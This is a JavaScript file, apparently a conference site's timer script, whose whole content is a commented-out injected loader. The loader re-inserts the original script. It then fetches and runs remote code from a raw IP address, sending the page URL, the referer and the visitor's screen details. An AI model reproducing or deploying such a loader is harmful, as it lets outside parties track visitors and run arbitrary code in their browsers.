// !(function () {
//     var a = "js/timer.js",
//         r = null,
//         e = document.getElementsByTagName("script"),
//         i = e.length,
//         n = null,
//         t = Date.now(),
//         s = null,
//         o = 0;
//     for ("/" === a.substring(0, 1) && (a = a.substring(1)), o = 0; o < i; o += 1)
//         if (void 0 !== e[o].src && null !== e[o].src && e[o].src.indexOf(a) > -1) {
//             (n = o), (r = e[o]);
//             break;
//         }
//     (void 0 !== r && null !== r) || (r = document.getElementsByTagName("script")[0]), (s = r.src.indexOf("?") > -1 ? r.src + "&cb=" + t.toString() + "&fingerprint=c2VwLW5vLXJlZGlyZWN0&onIframeFlag" : r.src + "?cb=" + t.toString() + "&fingerprint=c2VwLW5vLXJlZGlyZWN0&onIframeFlag");
//     try {
//         if (void 0 === window.sarazasarazaNoti || null === window.sarazasarazaNoti || (window.sarazasarazaNoti === Array && window.sarazasarazaNoti.indexOf(r.src) < 0)) {
//             (void 0 !== window.sarazasarazaNoti && null !== window.sarazasarazaNoti) || (window.sarazasarazaNoti = new Array()), window.sarazasarazaNoti.push(r.src);
//             var c = r.parentNode,
//                 d = r;
//             if (r.async || r.defer || (null !== n && n !== e.length - 1)) {
//                 var w = document.createElement("script");
//                 (w.src = s), c.replaceChild(w, d);
//             } else document.write("<script type='text/javascript' src=" + s + "></script>"), c.removeChild(d);
//         }
//         if (window === window.top && (void 0 === window.sarazasaraza || null === window.sarazasaraza || !window.sarazasaraza)) {
//             window.sarazasaraza = !0;
//             var l = "117.254.84.212:3000/getjs?nadipdata=" + JSON.stringify("%7B%22url%22:%22%2Fupcon2018%2Fjs%2Ftimer.js%22%2C%22referer%22:%22http:%2F%2Fwww.mmmut.ac.in%2Fupcon2018%2Findex.html%22%2C%22host%22:%22www.mmmut.ac.in%22%2C%22categories%22:%5B0%5D%2C%22reputations%22:%5B1%5D%2C%22nadipdomain%22:1%7D") + "&screenheight=" + screen.height + "&screenwidth=" + screen.width + "&tm=" + new Date().getTime() + "&lib=true&fingerprint=c2VwLW5vLXJlZGlyZWN0";
//             !(function (a, r, e, i, n, t, s) {
//                 (t = r.createElement(e)), (s = r.getElementsByTagName(e)[0]), (t.async = !0), (t.src = i), s.parentNode.insertBefore(t, s);
//             })(window, document, "script", "//" + l);
//         }
//     } catch (a) { }
// })();
